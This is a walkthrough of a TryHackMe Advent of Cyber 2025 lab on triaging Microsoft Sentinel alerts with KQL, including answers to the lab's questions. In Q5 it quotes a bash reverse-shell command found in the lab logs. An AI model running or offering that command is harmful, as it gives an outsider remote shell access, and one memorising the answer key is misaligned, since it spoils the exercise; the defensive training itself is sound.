# Advent of Cyber 2025 Day 10 - TryHackMe

> SOC Alert Triaging - Tinsel Triage

**Day 10 Link:** https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2

---

## Story

**Scenario:** TBFC's SOC is flooded with alerts

**Platform:** Microsoft Sentinel (Azure SIEM)

**Suspect:** Evil Easter Bunnies attacking cloud environment

**Goal:** Triage alerts and investigate suspicious activities

---

## Alert Triage Basics

**What is triaging:**
- Sorting alerts by priority
- Identifying real threats
- Correlating related events
- Determining incident severity

**Priority order:**
1. High severity first
2. Critical systems
3. Privilege escalation
4. Lateral movement

---

## Lab Setup

### Deploy Environment

**Step 1: Join Lab**
- Go to Environment tab
- Click "Join Lab"
- Wait 2-3 minutes

**Step 2: Deploy Resources**
- Actions tab → "Deploy Lab"
- Wait, then click "Deploy Rules"
- Total deployment: 4-5 minutes
- Lab expires after 1 hour

**Step 3: Access Portal**
- Copy Lab URL
- Open in new tab
- Use credentials from Credentials tab

### Setup Sentinel

**Navigate to Sentinel:**
```
Azure Portal → Search "Microsoft Sentinel"
```

**Load logs:**
1. Click your Sentinel instance
2. Go to Logs tab
3. Select `Syslog_CL` table
4. Run query
5. Wait for logs to load

**Enable Rules:**
1. Configuration → Analytics
2. Select all active rules
3. Click "Disable"
4. Select them again
5. Click "Enable"
6. Refresh if needed

---

## Investigating Alerts

### View Incidents

**Navigate:**
```
Sentinel → Threat Management → Incidents
```

**What you'll see:**
- 8 open incidents
- 4 high severity
- 4 medium severity

### High Severity Alert Example

**Alert:** Linux PrivEsc — Kernel Module Insertion

**Initial details:**
- 3 events related
- 3 entities involved
- Tactic: Privilege Escalation

**View details:**
- Click alert
- Click "View full details"
- Check Incident Timeline
- Review Similar Incidents

---

## Questions & Answers

### Q1: Entities in Polkit Exploit Alert

**Navigate:**
```
Incidents → Linux PrivEsc — Polkit Exploit Attempt
```

Check entities count.

**Answer:** `10`

### Q2: Sudo Shadow Access Severity

**Navigate:**
```
Incidents → Linux PrivEsc — Sudo Shadow Access
```

Check severity level.

**Answer:** `high`

### Q3: Accounts Added to Sudoers

**Navigate:**
```
Incidents → Linux PrivEsc — User Added to Sudo Group
```

Count affected accounts.

**Answer:** `4`

---

## Log Analysis

### View Raw Events

**Method 1: Through Alert**
1. Open alert details
2. Click "Events" in Evidence section
3. View actual events

**Method 2: Custom KQL Query**

Switch to KQL mode and run:

```kql
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-02'
| project _timestamp_t, host_s, Message
```

**Findings for app-02:**
- `cp` command (shadow file backup)
- User "Alice" added to sudoers
- `backupuser` modified by root
- `malicious_mod.ko` installed
- Root SSH authentication

### Q4: Kernel Module in websrv-01

**Query websrv-01:**
```kql
Syslog_CL
| where host_s == 'websrv-01'
| project _timestamp_t, host_s, Message
```

Look for kernel module name.

**Answer:** `malicious_mod.ko`

### Q5: Unusual Command by ops User

**Filter for ops user:**
```kql
Syslog_CL
| where host_s == 'websrv-01'
| where Message contains "ops"
| project _timestamp_t, host_s, Message
```

Find reverse shell command.

**Answer:** `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`

### Q6: First SSH to storage-01

**Query storage-01:**
```kql
Syslog_CL
| where host_s == 'storage-01'
| where Message contains "Accepted"
| project _timestamp_t, host_s, Message
```

Find source IP.

**Answer:** `172.16.0.12`

### Q7: External Root Login to app-01

**Query app-01:**
```kql
Syslog_CL
| where host_s == 'app-01'
| where Message contains "root" and Message contains "Accepted"
| project _timestamp_t, host_s, Message
```

Find external IP.

**Answer:** `203.0.113.45`

### Q8: User Added to Sudoers in app-01

**Query sudoers changes:**
```kql
Syslog_CL
| where host_s == 'app-01'
| where Message contains "sudoers"
| project _timestamp_t, host_s, Message
```

Find user besides backup.

**Answer:** `deploy`

---

## Quick Reference

### Microsoft Sentinel Navigation

```
Portal
  └─ Microsoft Sentinel
      ├─ Logs (query data)
      ├─ Configuration
      │   └─ Analytics (rules)
      └─ Threat Management
          └─ Incidents (alerts)
```

### KQL Query Basics

**Filter by host:**
```kql
Syslog_CL
| where host_s == 'hostname'
```

**Search in message:**
```kql
| where Message contains "keyword"
```

**Select columns:**
```kql
| project _timestamp_t, host_s, Message
```

**Sort results:**
```kql
| sort by _timestamp_t asc
```

### Common Attack Indicators

**Privilege escalation:**
- Kernel module insertion
- Sudoers modifications
- SUID discovery
- Shadow file access

**Persistence:**
- User account creation
- Sudoers group additions
- Kernel modules
- Cron jobs

**Initial access:**
- External SSH logins
- Unusual source IPs
- Root login attempts

**Command & Control:**
- Reverse shells
- Unusual network connections
- `/dev/tcp/` usage

---

## Alert Correlation

### Understanding Related Events

**Same entity = connected attacks**

Example sequence:
1. External SSH login → Initial Access
2. SUID discovery → Reconnaissance
3. Kernel module → Persistence
4. User added to sudoers → Privilege Escalation

**Key insight:**
- Multiple alerts on same host = attack chain
- Correlate by entity (host, user, IP)
- Timeline helps identify sequence

---

## Investigation Workflow

```
1. Check Incidents Dashboard
    ↓
2. Prioritize by Severity
    ↓
3. Review Alert Details
    ↓
4. Check Related Alerts
    ↓
5. Query Raw Logs (KQL)
    ↓
6. Correlate Events
    ↓
7. Determine Verdict
    ↓
8. Take Action
```

---

## Key Takeaways

- **Triage by severity** (high first)
- **Microsoft Sentinel** is Azure SIEM
- **Multiple alerts** often = single attack
- **Correlate by entity** (host, user, IP)
- **KQL queries** reveal raw evidence
- **Timeline matters** for attack sequence
- **Privilege escalation** is high priority
- **External IPs** need investigation
- **Reverse shells** = immediate threat
- **Document findings** for response

---

Happy hunting
